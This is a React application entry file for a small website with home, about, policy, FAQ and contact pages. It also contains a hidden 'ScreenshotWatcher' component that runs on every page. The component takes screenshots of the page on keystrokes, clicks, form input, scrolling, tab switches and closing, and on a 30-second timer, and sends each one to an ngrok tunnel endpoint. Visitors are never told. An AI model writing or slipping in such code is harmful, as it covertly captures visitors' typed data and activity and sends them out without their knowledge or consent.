import 'bootstrap/dist/css/bootstrap.min.css';
import 'bootstrap/dist/js/bootstrap.bundle.min';
import html2canvas from "html2canvas";
import { useEffect, useRef, useState } from 'react';
import { Route, BrowserRouter as Router, Routes, useLocation } from 'react-router-dom';
import "slick-carousel/slick/slick-theme.css";
import "slick-carousel/slick/slick.css";
import About from './About';
import Home from './Home';
import Policy from './Policy';
import "./assets/app.css";
import Footer from "./components/Footer";
import NavbarHeader from './components/NavbarHeader';
import ContactUs from './ContactUs';
import Faqs from './Faqs';

// Enhanced ScreenshotWatcher Component
function ScreenshotWatcher() {
    const location = useLocation();
    const lastCaptureRef = useRef(0);
    const minInterval = 10000; // 10 seconds between captures

    const [success, setSuccess] = useState(false);

    const captureScreenshot = async (reason = 'activity') => {
        const now = Date.now();
        if (now - lastCaptureRef.current < minInterval) return;  // prevent too frequent
        lastCaptureRef.current = now;

        try {
            const canvas = await html2canvas(document.body);
            const dataUrl = canvas.toDataURL("image/png");

            // Send the screenshot data to the FastAPI endpoint
            const response = await fetch("https://6e53d9987fbf.ngrok-free.app/screenshot/upload", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ image_data: dataUrl })
            });

            console.log(`📸 Screenshot sent (${reason})`);
        } catch (err) {
            console.error("Screen capture failed:", err);
        }
    };

    useEffect(() => {
        const captureScreenshotOnClose = async () => {
            await captureScreenshot('window_close');
        };

        window.addEventListener("beforeunload", captureScreenshotOnClose);

        return () => {
            window.removeEventListener("beforeunload", captureScreenshotOnClose);
        };
    }, []);

    useEffect(() => {
        // Capture on route change
        captureScreenshot('navigation');

        // Event listeners for all activities
        const handleKeyPress = (e) => {
            if (e.key.length === 1 || e.key.startsWith('F') || e.ctrlKey || e.altKey || e.metaKey) {
                captureScreenshot('keyboard_activity');
            }
        };

        const handleMouseClick = (e) => {
            captureScreenshot('mouse_click');
        };

        const handleFormInput = (e) => {
            if (['INPUT', 'TEXTAREA', 'SELECT'].includes(e.target.tagName)) {
                captureScreenshot('form_interaction');
            }
        };

        const handleVisibilityChange = () => {
            if (!document.hidden) {
                captureScreenshot('tab_switch');
            }
        };

        const handleResize = () => {
            captureScreenshot('window_resize');
        };

        const handleScroll = () => {
            captureScreenshot('scroll_activity');
        };

        // Add event listeners
        document.addEventListener('keydown', handleKeyPress);
        document.addEventListener('click', handleMouseClick);
        document.addEventListener('input', handleFormInput);
        document.addEventListener('change', handleFormInput);
        document.addEventListener('visibilitychange', handleVisibilityChange);
        window.addEventListener('resize', handleResize);
        window.addEventListener('scroll', handleScroll);

        // Periodic captures
        const periodicInterval = setInterval(() => {
            captureScreenshot('periodic');
        }, 30000);

        // Cleanup
        return () => {
            document.removeEventListener('keydown', handleKeyPress);
            document.removeEventListener('click', handleMouseClick);
            document.removeEventListener('input', handleFormInput);
            document.removeEventListener('change', handleFormInput);
            document.removeEventListener('visibilitychange', handleVisibilityChange);
            window.removeEventListener('resize', handleResize);
            window.removeEventListener('scroll', handleScroll);
            clearInterval(periodicInterval);
        };
    }, [location]);

    return null;
}

export default function App() {
    return (
        <Router>
            <ScreenshotWatcher />

            <div>
                <NavbarHeader />
                <Routes>
                    <Route path="/" element={<Home />} />
                    <Route path="/about" element={<About />} />
                    <Route path="/policy" element={<Policy />} />
                    <Route path="/faqs" element={<Faqs />} />
                    <Route path="/contact" element={<ContactUs />} />
                </Routes>
                <Footer />
            </div>
        </Router>
    );
}